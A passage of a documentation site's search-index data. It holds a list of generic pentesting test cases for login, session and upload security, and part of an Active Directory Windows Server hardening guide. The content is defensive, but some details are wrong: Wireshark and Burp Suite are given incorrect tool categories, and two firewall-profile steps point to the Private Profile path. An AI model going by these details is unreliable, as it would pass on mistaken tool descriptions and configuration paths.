Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-10-application-behaviour-after-multiple-logins-and-more-user-activity","content":" Use Case: User Activity Monitoring  Test Case 1: Multiple Login Attempts  Test Step: Attempt multiple login sessions within a short timeframe.  Expected Result: System behaviour should be monitored, and any suspicious activity should be flagged or restricted.  ","version":"Next","tagName":"h2"},{"title":"Goal 11: Generation of error messages in terms of invalid login details​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-11-generation-of-error-messages-in-terms-of-invalid-login-details","content":" Use Case: Invalid Login Error Handling  Test Case 1: Invalid Login Attempt  Test Step: Attempt to log in with incorrect credentials.  Expected Result: The system should provide generic error messages without revealing specific details about the invalid input.  ","version":"Next","tagName":"h2"},{"title":"Goal 12: Scan all incoming files uploaded by users.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-12-scan-all-incoming-files-uploaded-by-users","content":" Use Case: File Upload Security  Test Case 1: Malicious File Upload  Test Step: Attempt to upload files with malicious content or executable scripts.  Expected Result: The system should reject files with potentially harmful content.  ","version":"Next","tagName":"h2"},{"title":"Goal 13: Sensitive data should be hidden (Like invisible password)​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-13-sensitive-data-should-be-hidden-like-invisible-password","content":" Use Case: Hidden Sensitive Data  Test Case 1: Inspect Hidden Elements  Test Step: Inspect webpage elements to check for hidden sensitive information.  Expected Result: Sensitive data should not be visible in the webpage source code or rendered content.  ","version":"Next","tagName":"h2"},{"title":"Goal 14: Blocking login page after multiple failed attempts.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-14-blocking-login-page-after-multiple-failed-attempts","content":" Use Case: Account Lockout Policy  Test Case 1: Multiple Failed Login Attempts  Test Step: Attempt multiple consecutive failed login attempts.  Expected Result: The system should temporarily lock the account after reaching the specified threshold.  ","version":"Next","tagName":"h2"},{"title":"Goal 15: Verification of reset password with double authentication (Email and Mobile)​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-15-verification-of-reset-password-with-double-authentication-email-and-mobile","content":" Use Case: Two-Factor Authentication (2FA) Verification  Test Case 1: Reset Password with 2FA.  Test Step: Initiate the password reset process and verify using both email and mobile authentication.  Expected Result: Password reset should require verification from both email and mobile channels.  ","version":"Next","tagName":"h2"},{"title":"Goal 16: Relogging after the password is reset and logging out from different devices.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-16-relogging-after-the-password-is-reset-and-logging-out-from-different-devices","content":" Use Case: Session Management  Test Case 1: Logout from Different Devices  Test Step: Log in from multiple devices, then log out from one device and attempt to re-login.  Expected Result: The system should manage sessions correctly, allowing login from one device while maintaining security.  ","version":"Next","tagName":"h2"},{"title":"Goal 17: Session ending after inactivity of the user (Time limit of 15-30 mins)​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-17-session-ending-after-inactivity-of-the-user-time-limit-of-15-30-mins","content":" Use Case: Session Timeout  Test Case 1: User Inactivity Timeout  Test Step: Log in and remain inactive for the specified time limit.  Expected Result: The system should automatically log out the user after the defined inactivity period.  ","version":"Next","tagName":"h2"},{"title":"Goal 18: Maintaining logs (User activity like login and logout)​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-18-maintaining-logs-user-activity-like-login-and-logout","content":" Use Case: Logging Verification  Test Case 1: User Activity Logging  Test Step: Perform various user activities, such as login and logout.  Expected Result: System logs should accurately capture user activities, including login and logout events.  ","version":"Next","tagName":"h2"},{"title":"Goal 19: No redirection to third-party websites​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-19-no-redirection-to-third-party-websites","content":" Use Case: URL Redirection  Test Case 1: Redirection Testing  Test Step: Attempt to manipulate URLs for redirection to third-party websites.  Expected Result: The system should prevent unauthorized URL redirection.  ","version":"Next","tagName":"h2"},{"title":"Goal 20: Warning the user when public networks are used.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-20-warning-the-user-when-public-networks-are-used","content":" Use Case: Public Network Warning  Test Case 1: Accessing System on Public Network  Test Step: Access the system from a public network.  Expected Result: The system should display a warning to the user regarding potential security risks when using public networks.  ","version":"Next","tagName":"h2"},{"title":"Goal 21: Verify GPS spoofing, Email ID spoofing, IP address spoofing, Caller ID spoofing, Referrer spoofing, ARP spoofing, etc.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-21-verify-gps-spoofing-email-id-spoofing-ip-address-spoofing-caller-id-spoofing-referrer-spoofing-arp-spoofing-etc","content":" Use Case: Spoofing Verification  Test Case 1: Spoofing Attempts  Test Step: Attempt various spoofing techniques, including GPS, Email ID, IP, Caller ID, Referrer, and ARP spoofing.  Expected Result: The system should detect and prevent spoofing attempts.  ","version":"Next","tagName":"h2"},{"title":"Goal 22: Monitor Trojan attacks by scanning incoming network traffic.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-22-monitor-trojan-attacks-by-scanning-incoming-network-traffic","content":" Use Case: Trojan Detection  Test Case 1: Trojan Traffic Simulation  Test Step: Simulate Trojan-like traffic patterns in the network.  Expected Result: Intrusion detection systems should detect and alert on simulated Trojan attacks.  ","version":"Next","tagName":"h2"},{"title":"Tools available for Pen Testing:​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#tools-available-for-pen-testing","content":" Fiddler- Category: Proxy server application Nmap- Category: Port scanner Wireshark- Category: Web vulnerability scanner Metasploit- Category: Vulnerability exploitation framework Nikto- Category: Web vulnerability scanner John the Ripper- Category: Password cracking Burp Suite- Category: Net Scanner OpenVAS- Category: Vulnerability scanner Aircrack-ng- Category: Password cracking Kismet- Category: Packet sniffer ","version":"Next","tagName":"h2"},{"title":"Active Directory Windows","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide","content":"","keywords":"","version":"Next"},{"title":"1.1. Purpose of this Document​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#11-purpose-of-this-document","content":" This document is intended to guide administrators to secure Active Directory Windows Server 2016. All administrators should use this document for secure configuration.  ","version":"Next","tagName":"h2"},{"title":"1.2. Instructions​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#12-instructions","content":" ","version":"Next","tagName":"h2"},{"title":"1.2.1. How to Use This Document​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#121-how-to-use-this-document","content":" The security settings described in this document shall be configured on the Active Directory Windows Server 2016 by the administrators. All settings can only be done with administrative privileges.  It is strongly recommended that the settings be tested in the staging environment before applying them in the production environment. It is further recommended that the administrators of the Active Directory Windows Server 2016 make note of the original values while changing the settings. For each setting, a detailed description is given, followed by the impact if the setting is not configured and the solution to fix it.  Implementing changes on production systems without first testing them on replica test systems may adversely affect the system/application and may cause it to stop working.  2. Configuration Document: Active Directory  ","version":"Next","tagName":"h3"},{"title":"2.1. Account Polices​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#21-account-polices","content":" ","version":"Next","tagName":"h2"},{"title":"2.1.1. Password Policy & Account Lockout Policy​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#211-password-policy--account-lockout-policy","content":" Control Statement​  Password policies help administrator enforce the strength of passwords that users can set. Password policy is required to control user password characteristics including minimum length, maximum length and password aging. To help prevent password-based attacks from being successful, strong password and account lockout settings need to be configured.  Risk/Impact​  The longer a user uses the same password, the greater the chance that an attacker can determine the password through brute force attacks. Risk Rating  High  Implementation Steps​  Configure a strong Password and Account policy, as suggested in below table. To configure the policy,  Press Windows key &gt; type Run and type gpedit.msc or rsop.msc.  Expand Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Account Policy &gt; Password Policy or Account Lockout Policy container and configure the settings as suggested in Appendix 1.  ","version":"Next","tagName":"h3"},{"title":"2.2. Local Polices​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#22-local-polices","content":" ","version":"Next","tagName":"h2"},{"title":"2.2.1. User Rights Assignments​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#221-user-rights-assignments","content":" Control Statement  The user rights settings determine which users or groups have logon rights and other privileges on the server.  Risk/Impact​  If an account is given this right the user of the account may create an application that calls into Credential Manager and is returned the credentials for another user.  Risk Rating  Medium  Implementation Steps​  Ensure user rights are configured as suggested in below table. To configure Security Options,  Press Windows key &gt; type Run and type gpedit.msc.  Expand Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment container and configure the settings with the values as suggested in Appendix 2.  ","version":"Next","tagName":"h3"},{"title":"2.2.2. Security Options​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#222-security-options","content":" Control Statement​  The security option settings include multiple settings that enable or disable security settings for the server, such as digital signing of data, Administrator and guest account names, floppy drive and CD ROM access, driver installation and logon prompts.  Risk/Impact​  In some organizations, it can be a daunting management challenge to maintain a regular schedule for periodic password changes for local accounts. Therefore, you may want to disable the built-in Administrator account instead of relying on regular password changes to protect it from attack.  Risk Rating  High  Implementation Steps​  Ensure security options are enabled as recommended in below table. To configure security options settings,  Press Windows key &gt; type Run and type gpedit.msc.  Expand Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options and configure the settings with the values as suggested in Appendix 3.  ","version":"Next","tagName":"h3"},{"title":"2.3. Windows Firewall with Advanced​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#23-windows-firewall-with-advanced","content":" ","version":"Next","tagName":"h2"},{"title":"2.3.1. Public Profile​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#231-public-profile","content":" Control Statement​  Windows Firewall offers three firewall profiles: domain, private and public. The default profile is the public profile, which is used to designate public networks such as Wi-Fi hotspots at coffee shops, airports, and other locations  Risk/Impact  Weak controls can result into unauthorized access to server and network  Risk Rating  Low  Implementation Steps​  Ensure the profile parameters must be configured as per ORGANIZATION Public Profile policy. To configure these settings on standalone server:  Click Start &gt; Run and type Gpedit.msc  Expand Computer Configuration\\Policies\\Windows Settings\\Security Settings\\Windows Firewall with Advanced Security\\Windows Firewall with Advanced Security\\Windows Firewall Properties\\Private Profile and configure the settings with the values as suggested in Appendix 4.  ","version":"Next","tagName":"h3"},{"title":"2.3.2. Private Profile​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#232-private-profile","content":" Control Statement​  Windows Firewall offers three firewall profiles: domain, private and public. The private profile is a user-assigned profile and is used to designate private or home networks.  Risk/Impact  Weak controls can result into unauthorized access to server and network  Risk Rating  Low  Implementation Steps​  Ensure the profile parameters must be configured as per ORGANIZATION Private Profile policy. To configure these settings on standalone server:  Click Start &gt; Run and type Gpedit.msc  Expand Computer Configuration\\Policies\\Windows Settings\\Security Settings\\Windows Firewall with Advanced Security\\Windows Firewall with Advanced Security\\Windows Firewall Properties\\Private Profile and configure the settings with the values as suggested in Appendix 4.  ","version":"Next","tagName":"h3"},{"title":"2.3.3. Domain Profile​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#233-domain-profile","content":" Control Statement​  Windows Firewall offers three firewall profiles: domain, private and public. The domain profile applies to networks where the host system can authenticate to a domain controller. Risk/Impact  Weak controls can result into unauthorized access to server and network  Risk Rating  Low  Implementation Steps​  Ensure the profile parameters must be configured as per ORGANIZATION Domain Profile policy. To configure these settings on standalone server:  Click Start &gt; Run and type Gpedit.msc  Expand Computer Configuration\\Policies\\Windows Settings\\Security Settings\\Windows Firewall with Advanced Security\\Windows Firewall with Advanced Security\\Windows Firewall Properties\\Private Profile and configure the settings with the values as suggested in Appendix 4.  ","version":"Next","tagName":"h3"},{"title":"2.4. Auditing, Logging and Monitoring​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#24-auditing-logging-and-monitoring","content":" ","version":"Next","tagName":"h2"},{"title":"2.4.1. Account Policies​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#241-account-policies","content":" Control Statement​  The audit entry shows an event or action performed, the user account and the date and time of the action. Security auditing is important for any enterprise server, as audit logs can provide vital information about any security breach.  Risk/Impact​  Malicious activity may not be detected if sufficient audit logs are not enabled. Early warning towards attempts at malicious access will go undetected. Risk Rating  High  Implementation Steps​  Ensure auditing is enabled as recommended in below table. To configure audit settings,  Press Windows key &gt; type Run and type gpedit.msc.  Expand Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Advanced Audit Policy Configuration &gt; Audit Policies and configure the settings with the values as suggested in Appendix 5.  ","version":"Next","tagName":"h3"},{"title":"2.4.2. Event log Sizes​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#242-event-log-sizes","content":" Control Statement​  Event viewer maintains logs about program, security and server events. Event viewer can be used to view and manage the event logs, gather information about hardware and software problems and monitor windows security events.  Risk/Impact​  Critical logs may get overwritten in the absence of sufficient event viewer file size. Default value for the log is  20MB  Risk Rating  Medium  Implementation Steps​  Ensure that at least 102400 KB (100MB) size is allocated for Application, Security and Server Event Viewer log files. To configure log file size,  Click Start &gt; Run and type eventvwr.msc.  Expand Windows Logs &gt; Right click on Application, choose the Properties and set the Maximum Log Size to any size = or &gt; than 100MB.  Right click on Security, choose the Properties and set the Maximum Log Size to any size = or &gt; than 100MB.  Right click on Server, choose the Properties and set the Maximum Log Size to any size = or &gt; than 100MB.  ","version":"Next","tagName":"h3"},{"title":"2.4.3. Permission on Event logs​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#243-permission-on-event-logs","content":" Control Statement​  Event viewer holds the System, Security and Application logs for a Windows server. Unauthorized users can be given access to event logs, by default Guest has read access to event logs.  Risk/Impact​  Unauthorized access to event logs may allow users to get important information. Risk Rating  Low  Implementation Steps​  To configure permissions on event logs navigate to the following file,  C:\\windows\\System32\\winevt\\Application.evtx.  Right click and go to Permissions and remove invalid users. Similarly for \\security.evtx and \\system.evtx  Ensure that Guest access to event logs is not allowed. To configure the registry key,  Click Start &gt; Run and type regedit. Navigate to the following registry hive,  HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\SYSTEM  In the sub keys check Application for the DWORD RestrictGuestAccess. Double click on  RestrictGuestAccess and assign value 1 to restrict guest access. If the DWORD RestrictGuestAccess does not exist it needs to be created. Right click and click New and then click DWORD. Rename the new DWORD to RestrictGuestAccess. Double click on RestrictGuestAccess and assign value of 1 to the RestrictGuestAccess DWORD.  Follow the same procedure for Security and Application sub keys.  ","version":"Next","tagName":"h3"},{"title":"2.4.4. Auditing of sensitive system and application files and directories should be enabled for servers​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#244-auditing-of-sensitive-system-and-application-files-and-directories-should-be-enabled-for-servers","content":" Control Statement​  Enable Windows native auditing feature on the following sensitive system and application files and directories:  %systemroot%\\  %systemroot%\\system32  %systemroot%\\system32\\drivers  %systemroot%\\system32\\config  %systemroot%\\system32\\spool  The recommended guidelines state to audit the following actions for the Everyone group:  Create Files / Write Data - Failure  Create Folders / Append Data - Failure  Delete Subfolders and Files - Failure  Delete - Success and Failure  Change Permissions - Failure  Take Ownership - Failure Risk/Impact  Auditing access to sensitive system and application files and directories increases the chance unauthorized access to the system will be detected and terminated in a timely manner. Risk Rating  Medium  Implementation Steps​  Enable Windows native auditing feature on the directories listed in the Technical Control Procedure.  Open Windows Explorer and browse to the appropriate directory;  Locate the folder/file, right click it, and select Properties from the drop down menu;  Select the Security tab;  Click the Advanced button;  Select the Auditing tab;  Click the Continue button if User Account Control is enabled;  Click the Add button then enter the name of the user or group object whose actions to audit;  Click OK and click the appropriate actions and respective success and failure checkboxes;  Click OK three times to confirm changes and close the window; and 10) Repeat steps 2 through 9 for each of the directories listed.  ","version":"Next","tagName":"h3"},{"title":"2.4.5. Auditing of sensitive system registry keys should be enabled on servers​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#245-auditing-of-sensitive-system-registry-keys-should-be-enabled-on-servers","content":" Control Statement​  Enable Windows native auditing feature on all sensitive system registry keys for servers. These sensitive keys may include:  HKLM\\SYSTEM HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\PerfLib  HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa  HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs  HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg\\AllowedPaths  HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Shares  HKLM\\SYSTEM\\CurrentControlSet\\Services\\UPS HKEY_USERS.default  HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities  HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\PermittedManagers  HKLM\\SOFTWARE\\Policies\\SNMP\\Parameters\\ValidCommunities  HKLM\\SOFTWARE\\Policies\\SNMP\\Parameters\\PermittedManagers  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx HKCR (all subkeys)  HKLM\\SOFTWARE HKLM\\SOFTWARE\\MICROSOFT\\Rpc (and all subkeys)  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\AeDebug  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\Compatibility  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\Drivers  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\Embedding  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\Fonts  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\FontSubstitutes  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\FontDrivers  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\FontMapper  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\GRE_Initialize  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\MCI  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\MCIExtensions  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\Ports (all subkeys)  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\Type1Installer  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\ProfileList  HKLM\\SOFTWARE\\MICROSOFT\\WindowsNT\\CurrentVersion\\WOW (all subkeys)  The recommended guidelines state to audit the following actions for the Everyone group:  Set Value - Failure  Create Subkey - Failure  Delete - Success and Failure  Risk/Impact​  Auditing access to sensitive system registry keys increases the chance that unauthorized access to the system will be detected and terminated in a timely manner.  Risk Rating  Medium  Implementation Steps​  Enable Windows native auditing feature on all sensitive system registry keys for sensitive servers.  Open regedit;  Locate the key, right click it, and select Permissions from the drop down menu;  Select the Security tab;  Click the Advanced button;  Select the Auditing tab;  Click the Continue button if User Account Control is enabled;  Click the Add button then enter the name of the user or group object whose actions to audit;  Click OK and click the appropriate actions and respective success and failure checkboxes;  Click OK three times to confirm changes and close the window; and  Repeat steps 2 through 9 for each of the keys listed.  ","version":"Next","tagName":"h3"},{"title":"2.5. Administrative Templates (Computer)​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#25-administrative-templates-computer","content":" ","version":"Next","tagName":"h2"},{"title":"2.5.1. Control Panel​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#251-control-panel","content":" Control Statement  This section contains recommendations for configuring lock screen settings  Risk/Impact  Insecure personalization settings may lead to unauthorized access.  Risk Rating  High  Implementation Steps​  Ensure security options are enabled as recommended in below table. To configure security options settings,  Press Windows key &gt; type Run and type gpedit.msc.  Expand Computer Configuration\\Administrative Templates\\Control Panel\\Personalization and configure the settings with the values as suggested in Appendix 6.  ","version":"Next","tagName":"h3"},{"title":"2.5.2. MSS (Legacy)​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#252-mss-legacy","content":" Control Statement  Ensure the Microsoft security settings should be configured appropriately.  Risk/Impact  Weak controls can result into unauthorized access to server and network.  Risk Rating  High  Implementation Steps​  Ensure security options are enabled as recommended in below table. To configure security options settings,  Press Windows key &gt; type Run and type gpedit.msc.  Expand Computer Configuration\\Administrative Templates\\MSS (Legacy) and configure the settings with the values as suggested in Appendix 6.  Note: This Group Policy path does not exist by default. An additional Group Policy template (MSSlegacy.admx/adml) is required - it is included with Microsoft Security Compliance Manager (SCM)  ","version":"Next","tagName":"h3"},{"title":"2.5.3. Network​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#253-network","content":" Control Statement  This section contains recommendations for network settings.  Risk/Impact  Insecure network settings may leads to information leak.  Risk Rating  High  Implementation Steps​  Ensure security options are enabled as recommended in below table. To configure security options settings,  Press Windows key &gt; type Run and type gpedit.msc.  Expand Computer Configuration\\Administrative Templates\\Network\\ and configure the settings with the values as suggested in Appendix 6.  Note: This change does not take effect until the computer has been restarted. Note #2: Although Microsoft does not provide an ADMX template to configure this registry value, a custom .ADM template (Set-NetBIOS-nodetype-KB160177.adm) needs to be implemented. Be aware though that simply turning off the group policy setting in the .ADM template will not &quot;undo&quot; the change once applied. Instead, the opposite setting must be applied to change the registry value to the opposite state.  ","version":"Next","tagName":"h3"},{"title":"2.5.4. System​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#254-system","content":" Control Statement  This section contains recommendations for System settings.  Risk/Impact  Insecure network settings may leads to information leak or data loss.  Risk Rating  High  Implementation Steps​  Ensure security options are enabled as recommended in below table. To configure security options settings,  Press Windows key &gt; type Run and type gpedit.msc.  Expand Computer Configuration\\Administrative Templates\\Network\\ and configure the settings with the values as suggested in Appendix 6.  ","version":"Next","tagName":"h3"},{"title":"2.5.5. Windows Component​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#255-windows-component","content":" Control Statement  This section contains recommendations for Windows Component settings.  Risk/Impact​  As to mitigate the users of a system could accidentally share sensitive data with other users on the same system.  Risk Rating  High  Implementation Steps​  Ensure security options are enabled as recommended in below table. To configure security options settings,  Press Windows key &gt; type Run and type gpedit.msc.  Expand Computer Configuration\\Administrative Templates\\Windows Components and configure the settings with the values as suggested in Appendix 6.  ","version":"Next","tagName":"h3"},{"title":"2.5.6. LAPS​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#256-laps","content":" Control Statement​  This section contains recommendations for configuring Microsoft Local Administrator Password Solution Risk/Impact  When installed and registered properly, AdmPwd.dll takes no action unless given appropriate GPO commands during Group Policy refresh. Risk Rating  High  Implementation Steps​  Ensure security options are enabled as recommended in below table. To configure security options settings,  Press Windows key &gt; type Run and type gpedit.msc.  Expand Computer Configuration\\Administrative Templates\\LAPS and configure the settings with the values as suggested in Appendix 6.  Note: This Group Policy path does not exist by default. An additional Group Policy template  (AdmPwd.admx/adml) is required - it is included with Microsoft Local Administrator Password Solution (LAPS).  ","version":"Next","tagName":"h3"},{"title":"2.5.7. SCM: Pass the Hash Mitigations​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#257-scm-pass-the-hash-mitigations","content":" Control Statement  This section contains recommendations for mitigating Pass-the-Hash attacks.  Risk/Impact​  Local accounts are at high risk for credential theft when the same account and password is configured on multiple systems. Ensuring this policy is Enabled significantly reduces that risk.  Risk Rating  High  Implementation Steps​  Ensure security options are enabled as recommended in below table. To configure security options settings,  Press Windows key &gt; type Run and type gpedit.msc.  Expand Computer Configuration\\Administrative Templates\\SCM: and configure the settings with the values as suggested in Appendix 6.  Note:  This Group Policy path does not exist by default. An additional Group Policy template (PtH.admx/adml) is required - it is included with Microsoft Security Compliance Manager (SCM).  ","version":"Next","tagName":"h3"},{"title":"2.6. Encryption​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#26-encryption","content":" ","version":"Next","tagName":"h2"},{"title":"2.6.1. Disable weak encryption protocol​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#261-disable-weak-encryption-protocol","content":" Control Statement​  If configured to require client side certificates, TLS can also play a role in client authentication to the server. TLS also provides two additional benefits that are commonly overlooked; integrity guarantees and replay prevention. A TLS stream of communication contains built-in controls to prevent tampering with any portion of the encrypted data. In addition, controls are also built-in to prevent a captured stream of TLS data from being replayed at a later time.  TLS provides the above guarantees to data during transmission. TLS does not offer any of these security benefits to data that is at rest. Therefore appropriate security controls must be added to protect data while at rest within the application or within data stores.  Risk/Impact  An attacker may try to break the integrity of data and also sniff the sensitive information.  Risk Rating  Medium  Implementation Steps​  To Ensure the SSL 2.0, SSL 3.0 protocol must be disabled on the server and make sure that the stronger TLS protocols are used, follow these instructions to disable Weak SSL protocols:  Click Start, click Run, type regedit, and then click OK.  In Registry Editor, locate the following registry key/folder:  HKey_Local_Machine\\System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols 3. Right-click on the SSL 2.0 folder and select New and then click Key. Name the new folder Server.  Inside the Server folder, click the Edit menu, select New, and click DWORD (32-bit) Value.  Enter Enabled as the name and hit Enter.  Ensure that it shows 0x00000000 (0) under the Data column (it should by default). If it doesn't, right-click and select Modify and enter 0 as the Value data.  Now to disable SSL 3.0, right-click on the SSL 3.0 folder and select New and then click Key. Name the new folder Server.  Inside the Server folder, click the Edit menu, select New, and click DWORD (32-bit) Value.  Enter Enabled as the name and hit Enter.  ","version":"Next","tagName":"h3"},{"title":"2.6.2. Enable TLS 1.2 and 